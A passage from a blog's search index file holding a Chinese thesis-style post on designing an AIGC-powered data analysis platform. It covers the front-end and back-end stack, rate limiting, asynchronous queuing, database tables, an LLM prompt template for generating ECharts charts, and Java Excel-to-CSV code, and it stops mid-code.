<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>结合AIGC结合AIGC技术的数据分析平台的设计与实现</title>
      <link href="/2025/03/31/%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/03/31/%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="结合aigc-结合aigc技术的数据分析平台的设计与实现">结合AIGC 结合AIGC技术的数据分析平台的设计与实现</h2><p>[TOC]</p><p><strong>摘要</strong>：由于数据规模和复杂度的增加，传统的数据分析手段已满足不了人们的需求，出现了 Google Analytics 等数据分析平台，这些数据分析平台专业性强，操作复杂，不易使用。随着 OpenAI 发布 ChatGTP，人工智能发展正式步入 AIGC 普及化的新阶段，能进行数据分析，实现更加人性化的服务。故结合 AIGC 技术，设计了智能化的数据分析平台。系统前端采用 React + Ant Desigin Pro 技术实现数据的可视化，后端采用 Spring Boot + MySQL + MyBatis Plus 实现各模块的功能。通过该平台用户只需要提供原始数据和分析目标，业务后端通过 AI 服务对用户的需求进行理解和分析，从而获得分析结果和可视化图表，减轻了数据分析工作，提高了数据分析的效率，降低了数据分析门槛。</p><p><strong>关键词</strong>：AIGC 数据分析 人工智能</p><h3 id="引言">引言</h3><p>随着 OpenAI 发布大语言模型 ChatGPT 的爆火，标志着大模型、生成式人工智能 （Artificial Intelligence Generated Content，AIGC）正式步入普及化新阶段，带来巨大的技术和范式改变^[1]^。借助快速积累的数据和强大的算力性能，人工智能能够模仿人类思维方式生成内容并与人交互^[2]^。以 ChatGTP 为代表的人工智能生成内容技术是人机交互发展中的重大突破，其颠覆了内容的生产、表达和互动形式，得到广泛应用，产生深远影响，预测到 2026 年超过 80%的企业将使用生成式 AI 的 API 或模型，或在生产环境中部署支持生成式 AI 的应用[3]。因此，在各行各业里，AIGC 将成为重要的支柱之一。</p><p>数据分析是任何现实情况下的处理问题前的必要任务，以提取模糊数据背后的信息并总结研究情况中的规律。 这有助于管理者做出决策，以便他们能够实施适当的策略和行动。但随着数据规模的增加与数据多样性的变化带来的复杂度的急剧增加，传统的数据分析处理复杂、工作量大、可视化不足、缺乏预测性等问题越发显著，降低了工作效率。同时，已知的数据分析平台专业性强、操作复杂，不能立即上手操作，不适合多数人满足数据分析的需求。</p><p>随着人工智能的快速发展，利用 AIGC 技术对海量语言和文本数据进行信息挖掘和内容理解成为可能。在当今信息复杂的环境中，数据质量参差不齐，任务种类繁多，导致了数据孤岛和模型孤岛的存在，AIGC 技术能够很好地解决传统语言处理技术的不足^[4]^。</p><p>数据分析平台前端负责与用户交互，后端负责控制和处理数据。基于普通用户需求，研究并设计结合 AIGC 技术的数据分析平台，在前端用户只需要提供原始数据和分析目标，在后端利用 AI 对用户的需求进行理解和分析，从而获得分析结果和可视化图表。前端为一个可视化 BI 界面，含有用户登录注册，图表分析，图表管理三大功能；后端安排数据库对数据进行管理，开发文件上传接口，AI 对接，以及异步化的实现。减轻了数据分析的工作，显著地提高了数据分析的效率，降低了数据分析门槛，更加人性化^[5]^。</p><h3 id="1-相关理论与技术介绍">1 相关理论与技术介绍</h3><h4 id="1-1-开发环境">1.1 开发环境</h4><p>本项目的开发过程中同时使用了 WebStorm 和 IntelliJ IDEA，二者都是 JetBrains IDE 系列的一部分。WebStorm 是一款由 JetBrains 公司开发的集成开发环境，其专门用于前端模块开发。拥有丰富的功能和工具，无需安装和配置大量插件，WebStorm 从一开始就包含了 JavaScript 和 TypeScript 开发所需的一切。帮助开发者更高效地编写、调试和测试 Web 应用程序。IntelliJ IDEA 同样是由 JetBrains 公司开发的一款集成开发环境。IntelliJ IDEA 具有智能代码完成、语法高亮、自动导入包等功能，支持 Java、Kotlin、Groovy 等多种编程语言。尤其对于 Java 和 Kotlin 有着无与伦比的兼容性。和 WebStorm 一样，IntelliJ IDEA 的生态提供了大量的插件，可以扩展 IDE 的功能。</p><h4 id="1-2-前端使用技术">1.2 前端使用技术</h4><p>前端的使用了 React+ Umi+ Ant Design Pro 创建前端用户界面，技术架构示意图，如图 1-1 所示。</p><ol><li>React ：React 是一个用于创建用户界面的库。React 不仅仅是一个库、一种架构，甚至不只是一个生态系统，它的应用甚至不局限于 Web 开发，它可以与其他库一起使用以渲染到特定环境^[6]^。</li><li>Umi ：Umi 是可扩展的企业级 react 前端应用框架，配以生命周期完善的插件体系，覆盖从源码到构建产物的每个生命周期，支持各种功能扩展和业务需求^[7]^。</li><li>Ant Design Pro ：Ant Design Pro 是一款前端脚手架，用户可以在已搭建好的基础框架上继续向上构建自己的设计和方案。</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\前端技术的架构示意图.png"  /><center>图 1-1 前端技术的架构示意图 </center>#### 1.3 后端使用技术 <p>关于本平台后端的解决方案，在使用的技术，最底层为 Java 与 MySQL，使用RabbitMQ 作为中间件实现消息传递，在其上依次架构 EasyExcel、Hutool工具库、Swagger+Knife4j 项目接口文档等内容，最后服务层交由 AIGC 技术。后端的技术架构示意图，如图 1-2 所示。</p><ol><li>SpringBoot ：SpringBoot 是一个基于 Spring 的开源 Java 框架，使用 SpringBoot有效简化了 Spring 应用的配置和开发过程，是 Java 开发者最常使用的架构之一。</li><li>MySQL 数据库：MySQL 数据库是一种典型的关系型数据库，用于存储数据，具有体积小、占用空间小等特点^[8]^。</li><li>RabbitMQ：消息队列 RabbitMQ 是一款由 Rabbit Technologies 公司开发的，使用 Erlang 语言实现的，旨在实现 AMQP（Advanced Message Queuing Protocol 即高级消息队列协议）的开源消息中间件，具有可靠性、灵活性、高可拓展性。</li><li>AI 能力</li><li>EasyExcel ：EasyExcel 用于实现 Excel 的上传和数据的解析，可以实现在 Excel中完成读取、写入等任务。</li><li>Swagger + Knife4j 项目接口文档：Swagger 接口文档为前端调用后端代码的文件。根据后端的 Swagger 接口文档生成对应的前端请求 service 目录存储后端指定接口的方法代码。</li><li>Hutool 工具库：Hutool 工具库是一个存储了许多实用工具类的的 Java 工具库，能够减少开发者的工作量，更加快速的完成开发任务。</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\后端技术的架构示意图.png"  /><center>图 1-2 后端技术的架构示意图 </center>#### 1.4 AIGC 技术 <p>从狭义角度，AIGC 技术是区别于专业生产内容、用户生产内容等传统内容创作模式的一种新型内容创作方式，其利用 AI 技术实现自动生成内容。从广义角度，AIGC 技术泛指内容自动化生成的技术集合。AIGC 既是从内容生产者视角进行分类，又是一种内容生产方式，还是用于内容自动化生成的一类技术集合^[5]^。AIGC 根据面向对象、实现功能的不同可分为：智能数字内容孪生、智能数字内容编辑、智能数字内容创作。AIGC+其他，推进数实融合，加快产业升级，提升产业效率和价值。</p><h4 id="1-5-分库分表">1.5 分库分表</h4><p>当设计一个网站时，一般会将各种表都存储在同一个数据库中，每个表中都包含着 大量的信息。当使用该网站的用户人数比较少，访问量也比较少的时候，单库单表不会出现问题。但当网站的用户数量大量增加，网站功能和业务不断复杂，一张表会拥有很多字段，单个字段拥有许多内容，且整张表存储大量数据，这样会导致不仅一张表的查询压力比较大，如果还关联查询，时间等各方面的压力都在增大。在数据库中使用分库分表对数据库进行拆分可以有效得解决大数据量和高并发的问题。</p><ol><li><p>垂直分表：</p><ul><li>当表中字段很多的时候，按照字段进行垂直切分，将表中字段分成两组。一般会将不常用的、数据较大的、长度较长的拆分为“扩展表”。</li></ul></li><li><p>水平分表</p><ul><li>当表中数据量很大的时候，将表中数据按照某种规则切分到不同的表中，以达到分担单张表的数据量和访问量的目的。有效得降低了单张表的数据量，提高了查询效率，而且可以通过增加节点，提高系统的扩展性和容错性。但事务并发处理复杂度增加，需要增加分布式事务的管理，性能和复杂度都有所牺牲，而且跨节点查询困难，需要设计跨节点的查询模块。因为这些表还是在同一个数据库中，并且表的数据是一 直在增加的，随着数据量增加，表的不断增多，数据库的压力也会增加。</li></ul></li><li><p>垂直分库</p><ul><li>当数据库中的表太多的时候，会根据业务逻辑对数据库进行垂直切割，分为不同的业务模块，将不同业务模块字段或表存储在不同的数据库中。垂直分库基于数据库内核支持，对应用透明，无需额外的开发代码，易于维护。同时不同的数据库可以储 存在不同的服务器上，可以有效解决磁盘空间、内存等空间不足问题。有效的降低了单个数据库的数据量。</li></ul></li><li><p>水平分库</p><ul><li>水平分库指在多个服务器上分别存储一张表里切分出来的不同数据，每个服务器有相应的库和表，仅是表中数据集合不同。</li></ul></li></ol><h4 id="1-6-限流">1.6 限流</h4><p>限流也称流量控制，在系统面临高并发，或者大流量请求的情况下，限制新的请求对系统的访问，从而保证系统的稳定性，常见的限流算法如下：</p><p><strong>固定窗口限流</strong></p><p>以单位时间段作为一个窗口，维护一个计数器，计数器记录这个窗口接收请求的次数。当请求次数少于限流阈值，就允许访问；当请求次数大于限流阈值，就拒绝访问；当当前的时间窗口结束^[9]^，计数器清零。在旧一个时段的结束和新的时段的开始各并发 不超过限流阈值的访问请求，虽然在一个单位时间段里 0-1s 和 1-2s 都没有超过限流阈值，但若将结束和开始划为一个单位时间段就已经超过了限流阈值，如图 1-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\流量突刺.png" style="zoom:50%;" /><center>图 1-3 流量突刺 </center>**滑动窗口限流** <p>滑动窗口限流解决了固定窗口限流的临界问题。以单位时间作为一个滑动窗口，通过将时间窗口划分为更小的时间单位，每个子窗口都有计数限制。随着时间推移，会用新的子窗口替代过期的子窗口，形成一种“滑动”效果。当滑动窗口的划分的子窗口越多，滑动窗口的滚动就越平滑，限流统计就越精确。但一旦达到限流阈值后，访问请求都会被直接拒绝，会损失一部分访问请求。</p><p><strong>漏桶限流</strong></p><p>以固定的速率处理任意速率过来的访问请求，当请求数量达到限流阈值后就会拒绝访问请求。在一定程度上能应对流量突刺，能够固定速率处理请求，保证服务器的安全。但没办法迅速处理一批请求，只能以固定速率按顺序一个一个处理。</p><p><strong>令牌桶限流</strong></p><p>令牌桶限流可以应对突发流量的情况，以固定速率往令牌桶中添加令牌，当令牌数量达到限流阈值，就会被丢弃。访问请求需要获取到令牌后才能被系统接受并处理这个请求的业务逻辑，如果没有获得令牌请求访问会被拒绝，如图 1-4 所示。该策略提高了机器的利用率。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\令牌桶限流.png" style="zoom:80%;" /><center>图 1-4 令牌桶限流 </center>#### 1.7 线程池  <p>线程池一般用于执行多个不相关联的耗时任务。没有多线程的情况下，任务顺序执行，使用了线程池的话可让多个不相关联的任务同时执行^[10]^。当用户提交了任务，但任务需要很长时间的时候，用户不需要在电脑前等待，而是会保存在数据库。若要添加新的任务会进行判断，若任务提交成功了，存在空闲的线程就立即执行，不存在就放入任务队列中等待被处理。若任务提交失败了，会拒绝任务不执行或者在程序空闲时将提交 失败的任务取出执行。线程池执行流程如图 1-5 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\线程池执行流程.png" style="zoom: 80%;" /><center>图 1-5 线程池执行流程 </center>### 2 需求分析与系统设计 <p>​本系统在参考传统数据处理平台设计的基础上进行了改进，将 AIGC 技术与其结合，打造了一款高效的数据处理平台。客户端在输入数据和需求后，请求发送至业务后端。 在需求繁忙时，系统会进行限流，将任务排队放置于消息队列中。一旦某个功能处理完毕并处于空闲状态，系统将通知任务处理模块，并将新任务分配给空闲功能。任务处理 模块调用 AI 服务和数据库，AI 服务异步生成图表和分析结果，并将反馈发送给任务处理模块，而数据库则负责保存处理任务数据。</p><p>​前端采用 React +Ant Design Pro 以及可视化开发库 Echarts；后端使用 Spring Boot框架，MySQL 数据库存储数据，利用 MyBatis Plus 数据访问框架建立联系，并实现消息队列的异步化处理和 AI 接入。</p><h4 id="2-1-系统需求分析">2.1 系统需求分析</h4><p>在科技进步和生活方式改变的背景下，数据记录已由传统的纸质手记转向更高效的计算机记录和备份。然而，在如今的大数据时代，传统的数据分析已无法满足人们挖掘数据中所需信息的需求。</p><ol><li>传统数据分析处理复杂、工作量大。利用数据挖掘和深度学习算法，提供有效的数据处理和数据简化能力</li><li>传统数据分析时效性差。引用异步化，降低处理时间。</li><li>传统数据分析可视化能力不足。通过 BI 平台，将结果以图表形式展现。</li><li>传统数据分析缺乏预测性。利用人工智能和大数据技术，对历史数据进行分析预测^[11]^。</li><li>现有数据分析平台专业性强，操作复杂。利用 AIGC 技术，对用户需求进行理解，帮助其生成需要内容，更加人性化。</li></ol><h4 id="2-2-总体设计">2.2 总体设计</h4><p>在传统的数据分析平台中，如果用户想要分析数据的变化趋势，需要用户自己手动导入初始数据，并根据平台提供的选择来选择自己需要的图表和字段，因为是平台提供的选项用户可能找不到符合自己预期的目标，最后再交给专业的数据分析师完成分析，并获得分析结论。但普通用户并不需要专业的数据分析师，需求很小，只是需要分析原始数据获得一张想要的分析图表。故设计一个系统，用户即使不会图表设计和数据分析，只要将原始数据导入平台，业务后端的 AI 模型会对用户的需求进行分析，并生成可视化图表和分析结论。平台大体设计如图 2-1 所示。</p><ol><li>智能分析：用户输入目标和原始数据，可以自动生成图表和分析结论</li><li>图表管理：用户可以对历史图表进行删除、修改和搜索查看</li><li>图表生成的异步化</li><li>对接 AI 能力</li></ol><p>同时，考虑到随着该平台的使用人数增多，考虑到平台的安全、平台的成本开销等</p><p>问题，做了以下优化设计：</p><ol><li>安全性：对文件类型、文件大小进行检验</li><li>数据存储：利用分库分表理论，解决存储压力</li><li>限流：利用令牌桶限流思路，限制用户访问请求</li></ol><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\系统设计图.png" style="zoom:80%;" /><center>图 2-1 系统设计图 </center>#### 2.3 异步化设计 <p>​面临服务处理能力有限，或者接口处理（或返回）时长较长时，采用了异步化。</p><ol><li>因为 AI 生成结果时间过长，用户需要等待时间过长</li><li>业务服务器可能面临大量请求，导致系统资源紧张，严重时甚至可能导致服务器宕机或无法处理新的请求。</li><li>调用第三方服务（AI 能力）的处理能力有限。比如每 3 秒只处理 1 个请求， 就会导致 AI 处理不过来；严重时，AI 可能会对我们的后台系统拒绝服务。</li></ol><p>​故当大量用户都有需求，每个人都需要等待 AI 提供结果，将会导致 AI 工作压力太大，可以采用消息队列技术。通过消息队列，用户可以提交生成图表的请求，这些请求会进入队列，AI 服务会依次处理队列中的请求，从而避免了同时处理大量请求造成的压力，同时也能更好地控制资源的使用。</p><ol><li>同步：一件事做完，再做另外一件事情</li><li>异步：在处理一件事的同时，可以处理另一件事情。当第一件事完成时，会收到一个通知告知你这件事已经完成，这样就可以进行后续的处理。通常，如果想将同步变为异步，必须知道何时任务已经完成[12]。因此，需要一个通知机制。</li></ol><p>​在用户需要进行长时间的操作时，点击提交后不需要在界面空等。而是先保存至数据库。然后，将用户的操作或任务添加到任务队列中，让程序或线程执行。由于程序的处理能力或线程数有限，可以先把待处理任务放入队列中等待。等空闲时，再按顺序执行，而不是直接拒绝，处理流程如图 2-2 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\异步化优化处理流程.png" style="zoom: 80%;" /><center>图 2-2 异步化优化处理流程</center> #### 2.4 登录注册模块设计 <p>用户需要使用平台的智能分析服务要先在登录页面进行登录。如果还没有注册过用户信息在登录过程中会报错，在登录页系统会对数据库已存储用户信息进行匹配，匹配成功即用户完成登录，否则返回错误信息。用户登录注册模块的具体流程如图 2-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\系统登录注册模块流程图.png" style="zoom:80%;" /><center>图 2-3 系统登录注册模块流程图 </center>#### 2.5 智能分析模块设计 <p>​AI 服务接口需要接收系统用户前端输入的分析目标和原始数据，以及可选择填写的图表类型和图表类型信息，但在 AI 接收系统用户提交的信息之前，后端需要对提交信息合法性进行校验，防止恶意攻击，保证系统的安全性。同时还要对系统使用次数进行统计和校验，以控制系统成本。最后，调用 AI 接口，将处理成 csv 格式的数据输入给AI 模型，AI 模型接受系统用户描述的需求进行分析，理解出用户想要什么，然后对 csv格式的数据进行分析处理，会按照系统用户描述的需求给出分析结论，如果系统用户提供了图表类型要求会按照系统用户要求生成图表代码，如果系统用户没有提供图表类型，AI 模型会提供一个 json 配置的图表代码，会先将 AI 模型生成的结果上传到数据库，然后前端获得数据库中的数据生成可视化图表界面。智能分析模块的具体处理流程如图 2-4 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析处理流程.png" style="zoom:67%;" /><center>图 2-4 智能分析处理流程</center> #### 2.6 库表和接口设计 <h5 id="2-6-1-库表设计">2.6.1 库表设计</h5><p>​数据分析平台的数据库中包含 2 个表：用户信息表 user、图表信息表 chart。用户信息表 user 主要用于存储用户登录和注册信息；图表信息表 chart 存储两次，一次用于存储用户提交的分析目标和原始数据，一次用于存储 AI 模型分析出的图表数据和分析结论。用户实体 E-R 图如图 2-5 所示，需求图表实体 E-R 图如图 2-6 所示，结果图表实体E-R 图如图 2-7 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\用户实体 E-R 图.png" style="zoom:80%;" /><center>图 2-5 用户实体 E-R 图 </center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\需求图表实体 E-R 图.png" style="zoom:80%;" /><center>图 2-6 需求图表实体 E-R 图 </center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\结果图表实体 E-R 图.png" style="zoom:80%;" /><center>图 2-7 结果图表实体 E-R 图</center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\数据库 E-R 图.png" style="zoom:80%;" /><center>图 2-8 数据库 E-R 图 </center>**用户信息表 user** <blockquote><p>用户信息表 user 主要存放用户信息，其中 uid 是主键，如表 2-1 所示。</p></blockquote><center>表 2-1 用户信息表 user </center>| 列名          | 说明          | 类型          || ------------- | ------------- | ------------- || uid           | 用户 ID(主键) | bigint        || user_Account  | 账号          | varchar(256)  || user_Password | 密码          | varchar(512)  || user_Name     | 用户昵称      | varchar(256)  || user_Avater   | 用户头像      | varchar(1024) || user_Role     | varchar(256)  | varchar(256)  |<p><strong>需求图表信息表 chart1</strong></p><blockquote><p>需求图表信息表 chart1 主要存放了系统用户的分析需求，其中 xid 是主键，uid 是外键如表 2-2 所示。</p></blockquote><center>表 2-2 需求图表信息 chart1 </center>| 列名      | 说明              | 类型         || --------- | ----------------- | ------------ || xid       | 需求图表 id(主键) | bigint       || goal      | 分析目标          | text         || name      | 图表名称          | varchar(128) || chartData | 原始数据          | text         || chartType | 图表类型          | varchar(128) || uid       | 用户 ID（外键）   | text         |<p><strong>结果图表信息表 chart2</strong></p><blockquote><p>结果图表信息表 chart2 主要存放了系统 AI 模型生成的分析结果，其中jid是主键，xid 是外键，如表 2-3 所示</p></blockquote><center>表 2-3 结果图表信息 chart2 </center>| 列名       | 说明                | 类型     || ---------- | ------------------- | -------- || jid        | 结果图表 ID(主键)   | bigint   || genChart   | 生成的图表代码      | text     || genResult  | 生成的分析结论      | text     || xid        | 需求图表 id（外键） | bingint  || createTime | 创建时间            | datetime || updateTime | 更新时间            | datetime || isDelete   | 是否删除            | tinyint  |<h5 id="2-6-2-接口设计">2.6.2 接口设计</h5><p>​数据分析平台的接口目录有 3 个，分别为用户接口 UserController、图表接口 ChartController、文件接口 FileController。用户接口 UserController 主要用于系统用户的登录与注册，以及用户信息查询，用户接口信息如表 2-4 所示。</p><center>表 2-4 用户接口信息表 UserController </center>| 接口名称         | 说明                         || ---------------- | ---------------------------- || addUser          | 创建用户                     || deleteUser       | 删除用户                     || getUserById      | 根据 ID 获取用户（仅管理员） || getLoginUser     | 获取当前登录用户             || getUserVOById    | 根据 ID 获取包装类           || listUserByPage   | 分页获取用户列表（仅管理员） || listUserVOByPage | 分页获取用户封装列表         || userLogin        | 用户登录                     || userRegister     | 用户注册                     || userLogout       | 用户注销                     || updateUser       | 更新用户                     || updateMyUser     | 更新个人信息                 |<p>​图表接口 ChartController 主要用户智能分析 AI 接口的实现和系统用户对历史图表的管理，图表接口信息如表 2-5 所示</p><center>表 2-5 图表接口信息表 ChartController </center>| 接口名称          | 说明                           || ----------------- | ------------------------------ || addChart          | 创建图表接口                   || deleteChart       | 删除图表                       || editChart         | 编辑图表（用户）               || genChartByAi      | 智能分析                       || getChartById      | 根据 ID 获取图表信息           || listChartByPage   | 分页获取列表（封装类）         || listMyChartByPage | 分页获取当前用户创建的图表信息 || updateChart       | 更新图表（仅管理员）           |<p>​文件接口 FileController 主要用于系统用户数据文件的上传，以及安全性校验，文件接口信息如表 2-6 所示</p><center>表 2-6 文件接口信息表 FileController </center>| 接口名称   | 说明     || ---------- | -------- || uploadFile | 文件上传 |<h3 id="3-系统实现">3 系统实现</h3><h4 id="3-1-系统登录注册模块实现">3.1 系统登录注册模块实现</h4><p>​用户没有登陆时平台时不能显示功能的，当用户填写了用户名和密码，经后端校验正确后才能够使用该平台的功能，否则会提示用户名或密码错误，要求再次填写。而没有注册的用户需要先注册一下信息，将数据信息存入后端数据库才可以使用平台。</p><p>​在前端创建登录页和注册页用于给用户进入平台和填写账号密码。前端设计如图 3-1 所示。后端会对信息进行审核，没有问题后数据才会录进数据库中，后端显示结果如图 3-2 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\用户登录页面.png" style="zoom: 50%;" /><center>图 3-1 用户登录页面</center><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\注册成功后后端显示结果.png" style="zoom: 60%;" /><center>图 3-2 注册成功后后端显示结果</center>​为避免登陆再刷新后，页面返回登录页需要重新登陆，可以添加 cookie。通过 cookie前端可以知道后端已登陆，并告知后端哪个电脑端或客户端的登录状态。代码如下： <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//修改前端的全局请求，添加 cookie </span>withCredentials<span class="token operator">:</span> <span class="token boolean">true</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-2-智能分析模块实现">3.2 智能分析模块实现</h4><p>​根据需求设计，页面分为三个板块：智能分析板块、分析结论板块和可视化图表板块。其中，智能分析板块需要添加文本框、下拉按钮、文件上传按钮、提交按钮、重置按钮，都需要和后端数据库连接，获取数据。界面设计如图 3-3 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析板块设计.png" style="zoom: 50%;" /><center>图 3-3 智能分析板块设计</center>因为传输过来的是对象，需要找到数据真正对应的参数。代码如下： <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">const</span> res <span class="token operator">=</span> await <span class="token function">genChartByAiUsingPost</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> values<span class="token punctuation">.</span>file<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originFileObj<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​最后，用户提供分析目标和原始数据（必填项）后点击开始分析，待后端处理完成后，会显示数据分析结论和可视化图表。用户也可以自己选择图表类型，为了方便图表管理，用户可以为当前操作结果提供图表名称。操作示例如图 3-4 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\智能分析页面.png" style="zoom: 80%;" /><center>图 3-4 智能分析页面</center>#### 3.3 AI 服务接口实现 <p>AI 服务接口的实现主要在传入信息时对其进行要先进行处理，主要为提示语和数据压缩两个方面。</p><p><strong>AI 提问</strong></p><p>为了能让 AI 模型对系统用户描述的需求能够分析并理解成我们需要的样子，然后对输入的数据进行处理，输出我们想要的结果，需要对 AI 模型不断调整提问词，可以在以下三个方面实现：</p><p>​① 使用系统预设和控制输入格式，便于 AI 精确地理解我们的需求</p><p>​② 输出格式，便于 AI 返回的内容能够更加方便地为我们所用</p><p>​③ 指定一个示例问答，one-shot 或者 few-shot</p><p>下面是本系统设定的提示语 prompt：</p><p>你是一位数据分析师，也是一位前端开发的程序员，我会以一定格式给你输入一段csv 格式的数据，具体格式下：</p><pre class="line-numbers language-none"><code class="language-none">分析需求： （数据分析的需求或者目标） 原始数据： （csv 格式的原始数据，用,作为分隔符） 请根据以上内容，帮我按照指定格式生成内容，如： ----- &#123;前端 Echarts V5 的 option 配置对象 js 代码，合理地将数据进行可视化&#125;  ----- &#123;图表的描述，以及明确的数据分析结论，越详细越好&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据压缩</strong></p><p>​首先，在 ChartController.java 文件的 genChartByAi 接口方法中获取用户的输入和excel 文件。因为用户上传的原始数据的文件不适合直接上传，并且 AI 接口普遍有字数限制，需要对其进行压缩能够多传数据，以及 AI 模型输入的是数据而不是文件，需要将 excel 文件转为 csv。故在 ExcelUtils.java 文件中创建一个工具类 excelToCsv，使用 csv 对 excel 文件的数据进行提取和压缩。为防止数据不干净，还需要对其进行过滤。最后，在 genChartByAi 接口方法中调用工具类 excelToCsv 将压缩好的数据字符串。关键代码如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//读取出数据 </span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token keyword">try</span><span class="token punctuation">&#123;</span> list <span class="token operator">=</span> <span class="token class-name">EasyExcel</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>multipartFile<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">excelType</span><span class="token punctuation">(</span><span class="token class-name">ExcelTypeEnum</span><span class="token punctuation">.</span>XLSX<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sheet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">headRowNumber</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">doReadSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"表格处理错误"</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">CollUtil</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//转为 csv </span><span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取表头 </span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerList <span class="token operator">=</span> headerMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">ObjectUtils</span><span class="token operator">::</span><span class="token function">isNotEmpty</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤 null </span>stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token 